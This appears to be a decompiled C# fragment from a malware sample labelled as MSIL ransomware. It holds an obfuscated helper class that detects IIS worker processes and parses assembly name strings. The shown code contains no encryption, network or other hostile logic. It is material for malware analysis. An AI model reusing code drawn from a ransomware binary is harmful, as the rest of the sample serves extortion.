// Decompiled with JetBrains decompiler
// Type: #d.#n
// Assembly: 2012, Version=0.0.0.0, Culture=neutral, PublicKeyToken=6bd9dd2807ddb306
// MVID: 60A44901-35B0-4353-8B52-C0C6D76F7330
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-60bae245c7125c2b45d455051e06c7c45cd4dc57b95e0d873316369d8bff34eb.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Text;

namespace \u0023d
{
  internal sealed class \u0023n
  {
    internal const string \u0023e = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0023f = 4;
    internal static Hashtable \u0023g = new Hashtable();

    internal static bool IsWebApplication
    {
      get
      {
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (lower == "w3wp.exe")
            return true;
          if (lower == "aspnet_wp.exe")
            return true;
        }
        catch
        {
        }
        return false;
      }
    }

    internal struct \u0023u
    {
      public string \u0023o;
      public Version \u0023p;
      public string \u0023q;
      public string \u0023r;

      public string \u0023s(bool _param1)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u0023o);
        if (_param1 && this.\u0023p != (Version) null)
        {
          stringBuilder.Append(", Version=");
          stringBuilder.Append((object) this.\u0023p);
        }
        stringBuilder.Append(", Culture=");
        stringBuilder.Append(this.\u0023q.Length == 0 ? "neutral" : this.\u0023q);
        stringBuilder.Append(", PublicKeyToken=");
        stringBuilder.Append(this.\u0023r.Length == 0 ? "null" : this.\u0023r);
        return stringBuilder.ToString();
      }

      public \u0023u(string assemblyFullName)
      {
        this.\u0023p = (Version) null;
        this.\u0023q = string.Empty;
        this.\u0023r = string.Empty;
        this.\u0023o = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0023p = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0023q = str3.Substring(8);
            if (this.\u0023q == "neutral")
              this.\u0023q = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0023r = str3.Substring(15);
            if (this.\u0023r == "null")
              this.\u0023r = string.Empty;
          }
          else
            this.\u0023o = str3;
        }
      }
    }
  }
}
